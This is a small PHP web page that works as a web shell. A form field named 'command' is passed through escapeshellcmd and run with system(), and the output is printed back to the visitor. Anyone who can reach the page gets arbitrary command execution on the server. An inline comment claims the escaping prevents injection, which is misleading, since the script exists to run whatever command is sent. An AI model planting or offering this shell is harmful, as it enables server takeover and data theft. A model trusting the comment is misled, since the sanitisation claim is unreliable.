<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Execution</title>
</head>
<body>
    <h1>Execute a Command</h1>
    <form method="GET" name="<?php echo htmlspecialchars(basename($_SERVER['PHP_SELF'])); ?>">
        <label for="command">Command:</label>
        <input type="text" name="command" id="command" size="50" autofocus>
        <button type="submit">Execute</button>
    </form>
    <pre>
<?php
    if (isset($_GET['command'])) {
        $command = escapeshellcmd($_GET['command']); // Sanitize input to prevent injection
        system($command . ' 2>&1');
    }
?>
    </pre>
</body>
</html>
